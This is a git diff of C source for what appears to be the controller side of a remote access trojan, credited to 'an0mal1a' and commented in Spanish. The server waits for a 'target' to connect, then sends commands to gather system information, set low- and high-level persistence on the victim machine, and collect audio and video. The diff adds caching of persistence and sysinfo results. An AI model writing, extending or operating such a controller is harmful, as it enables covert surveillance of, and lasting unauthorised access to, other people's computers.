@@ -14,7 +14,13 @@
 #include <fcntl.h>
 #include "../src/base64.c"
 
-//Funcio upload/download video/audio funcionando correctamente
+/*
+
+  Creado por "an0mal1a"
+
+       https://github.com/an0mal1a
+
+*/
 
 // Variables globales
 int serverSock, targetConn;
@@ -22,6 +28,15 @@ int countAudio, countVideo = 0;
 
 // Definiciones
 #define SOCKBUFFER 2048
+
+// Estructuras de datos
+typedef struct {
+    char sysinfo[2048];
+    char persistence[2048];
+    char lowpersistence[2048];
+} Commands;
+Commands CachedCommands;
+
 
 //Colores
 const char *GREEN = "\033[0;32m\033[1m";
@@ -84,10 +99,7 @@ void closeConection(int targetConn, char *command, size_t instructLen, char *cli
 }
 
 void checkStart(char *IPAddress){
-    char formed[SOCKBUFFER];
-    char formed1[SOCKBUFFER];
-    char formed2[SOCKBUFFER];
-    char formed3[SOCKBUFFER];
+    char formed[SOCKBUFFER]; char formed1[SOCKBUFFER]; char formed2[SOCKBUFFER]; char formed3[SOCKBUFFER];
     snprintf(formed, SOCKBUFFER, "./DATA/%s", IPAddress);
     snprintf(formed1, SOCKBUFFER, "./DATA/%s/video", IPAddress);
     snprintf(formed2, SOCKBUFFER, "./DATA/%s/audio", IPAddress);
@@ -321,9 +333,10 @@ int downloadFunc(char *command, int targetConn, char *ip){
 
 }
 
-char* getSystemInformation(int targetConn, char *command){
-    send(targetConn, command, strlen(command), 0);
+char* getSystemInformation(int targetConn, char *command){ 
     char* recvData = malloc(SOCKBUFFER);
+
+    send(targetConn, command, strlen(command), 0); 
 
     while (true){
         recv(targetConn, recvData, SOCKBUFFER, 0);
@@ -334,47 +347,70 @@ char* getSystemInformation(int targetConn, char *command){
             continue;
         
     }
-
     return recvData;
+    
 }
 
 char* decodeSystemInformation(char *codedSysInfo){
     long input_size = strlen(codedSysInfo) ;    
     char* decodedSystemInfo = base64_decode(codedSysInfo, input_size, &input_size);
+    strncpy(CachedCommands.sysinfo, decodedSystemInfo, 2048);
     return decodedSystemInfo;
 }
 
 void StartGetSysInfo(int targetConn, char *command){
-    char *codedSysInfo = getSystemInformation(targetConn, command);
-    printf("%s\n", decodeSystemInformation(codedSysInfo));
+    if (CachedCommands.sysinfo[0] != '\0')    
+       printf("%s[*]%s Cached Command:%s %s", YELLOW, RED, end, CachedCommands.sysinfo);
+        
+    else {
+        char *codedSysInfo = getSystemInformation(targetConn, command);
+        printf("%s\n", decodeSystemInformation(codedSysInfo));
+        free(codedSysInfo);
+    }
 
 }
 
-int setPersistence(int targetConn, char *command){
-    send(targetConn, command, strlen(command), 0);
-    char* recvData = malloc(SOCKBUFFER);  
+int setPersistence(int targetConn, char *command) {
+    char* recvData = malloc(SOCKBUFFER);
 
-    recv(targetConn, recvData, SOCKBUFFER, 0);
+    if (strcmp(command, "lowpersistence") == 0) {
+        if (CachedCommands.lowpersistence[0] != '\0') {
+            // El comando lowpersistence ya está en la caché
+            printf("\n\t%s[*]%s Cached Command:%s %s \n", YELLOW, RED, end, CachedCommands.lowpersistence);
+        } else if (CachedCommands.persistence[0] != '\0') {
+            // El comando high ya está en la caché, mostrar el mensaje de caché
+            printf("\n\t%s[*]%s Cached Command:%s %s \n", YELLOW, RED, end, CachedCommands.persistence);
+        } else {
+            // Enviar solicitud al servidor
+            send(targetConn, command, strlen(command), 0);
+            recv(targetConn, recvData, SOCKBUFFER, 0);
 
-    if (strcmp(command, "lowpersistence") == 0){
-        if (strcmp("error", recvData) == 0){
-            printf("\n\n\t%s[!>] %sError getting low persistence...\n\n%s", RED, YELLOW, end);
-        }
-        else if (strcmp("exito", recvData) == 0){
-            printf("\n\n\t%s[*>] %sLow persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);    
+            if (strcmp("error", recvData) == 0){
+                printf("\n\n\t%s[!>] %sError getting low persistence...\n\n%s", RED, YELLOW, end);
+            } else if (strcmp("exito", recvData) == 0){
+                strncpy(CachedCommands.lowpersistence, "Low persistence has been added successfully!", 2048);
+                printf("\n\n\t%s[*>] %sLow persistence set successfully...\n\n%s", YELLOW, BLUE, end);
+            }
         }
     }
 
-    if (strcmp(command, "persistence") == 0){
-        if (strcmp("error", recvData) == 0){
-            printf("\n\n\t%s[!>] %sError getting high persistence...\n\n%s", RED, YELLOW, end);  
-        
-        } else if (strcmp("exito", recvData) == 0){
-            printf("\n\n\t%s[*>] %sHigh persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);
+    if (strcmp(command, "persistence") == 0) {
+        if (CachedCommands.persistence[0] != '\0') {
+            // El comando persistence ya está en la caché
+            printf("\n\t%s[*]%s Cached Command:%s %s \n", YELLOW, RED, end, CachedCommands.persistence);
+        } else {
+            // Enviar solicitud al servidor
+            send(targetConn, command, strlen(command), 0);
+            recv(targetConn, recvData, SOCKBUFFER, 0);
 
-        } else if (strcmp("permissonError", recvData) == 0){
-            printf("\n\t%s[!>] %sError setting persistence, PermissonError...\n", YELLOW, BLUE);
-        
+            if (strcmp("error", recvData) == 0){
+                printf("\n\n\t%s[!>] %sError getting high persistence...\n\n%s", RED, YELLOW, end);
+            } else if (strcmp("exito", recvData) == 0){
+                strncpy(CachedCommands.persistence, "High persistence has been added successfully!", 2048);
+                printf("\n\n\t%s[*>] %sHigh persistence set successfully...\n\n%s", YELLOW, BLUE, end);
+            } else if (strcmp("permissonError", recvData) == 0){
+                printf("\n\t%s[!>] %sError setting persistence, PermissonError...\n", YELLOW, BLUE);
+            }
         }
     }
 
@@ -646,7 +682,7 @@ int main(int argc, char const* argv[]){
         perror("Error al configurar el manejador de señales");
         exit(EXIT_FAILURE);
     }
-
+ 
     printf("%s\n[!>] %sWaiting For target to connect...%s\n\n", YELLOW, RED, end); 
     startServer();
     return 0;
